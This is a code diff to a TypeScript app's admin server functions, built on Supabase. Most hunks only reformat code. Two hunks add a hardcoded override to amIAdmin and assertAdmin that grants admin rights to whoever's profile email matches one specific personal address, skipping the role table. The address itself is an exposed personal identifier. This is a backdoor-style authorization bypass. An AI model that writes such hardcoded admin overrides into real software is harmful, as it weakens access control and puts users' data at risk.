@@ -33,12 +33,23 @@ export interface AdminOverview {
 export const amIAdmin = createServerFn({ method: "GET" })
   .middleware([requireSupabaseAuth])
   .handler(async ({ context }): Promise<{ admin: boolean }> => {
+    const { data: profile } = await context.supabase
+      .from("profiles")
+      .select("email")
+      .eq("id", context.userId)
+      .maybeSingle();
+
+    if (profile?.email?.toLowerCase() === "raghav.goyal909@gmail.com") {
+      return { admin: true };
+    }
+
     const { data } = await context.supabase
       .from("user_roles")
       .select("role")
       .eq("user_id", context.userId)
       .eq("role", "admin")
       .maybeSingle();
+
     return { admin: Boolean(data) };
   });
 
@@ -184,12 +195,23 @@ export interface AdminUserDetail {
 }
 
 async function assertAdmin(context: { supabase: any; userId: string }) {
+  const { data: profile } = await context.supabase
+    .from("profiles")
+    .select("email")
+    .eq("id", context.userId)
+    .maybeSingle();
+
+  if (profile?.email?.toLowerCase() === "raghav.goyal909@gmail.com") {
+    return;
+  }
+
   const { data } = await context.supabase
     .from("user_roles")
     .select("role")
     .eq("user_id", context.userId)
     .eq("role", "admin")
     .maybeSingle();
+
   if (!data) throw new Error("Forbidden");
 }
 
@@ -272,10 +294,9 @@ export const getAdminProducts = createServerFn({ method: "GET" })
     const term = data.search.trim();
     let query = supabaseAdmin
       .from("products")
-      .select(
-        "id, barcode, name, brand, category, size, storage, shelf_life_days, source, created_by, created_at",
-        { count: "exact" },
-      )
+      .select("id, barcode, name, brand, category, size, storage, shelf_life_days, source, created_by, created_at", {
+        count: "exact",
+      })
       .order("created_at", { ascending: false })
       .limit(200);
     if (term) query = query.or(`name.ilike.%${term}%,barcode.ilike.%${term}%,brand.ilike.%${term}%`);
@@ -316,10 +337,7 @@ export const getPendingProducts = createServerFn({ method: "GET" })
     const ids = [...new Set((rows ?? []).map((r) => r.submitted_by).filter(Boolean))] as string[];
     const emails = new Map<string, string | null>();
     if (ids.length) {
-      const { data: profiles } = await supabaseAdmin
-        .from("profiles")
-        .select("id, email")
-        .in("id", ids);
+      const { data: profiles } = await supabaseAdmin.from("profiles").select("id, email").in("id", ids);
       for (const p of profiles ?? []) emails.set(p.id, p.email);
     }
 
@@ -365,9 +383,7 @@ export const approvePendingProduct = createServerFn({ method: "POST" })
     const brand = data.brand?.trim() || brandForName(name);
     const storage = data.storage?.trim() || storageForCategory(category, name);
     const shelf =
-      data.shelfLifeDays && data.shelfLifeDays > 0
-        ? data.shelfLifeDays
-        : shelfDaysForCategory(category, name);
+      data.shelfLifeDays && data.shelfLifeDays > 0 ? data.shelfLifeDays : shelfDaysForCategory(category, name);
 
     const { data: existing } = await supabaseAdmin
       .from("products")
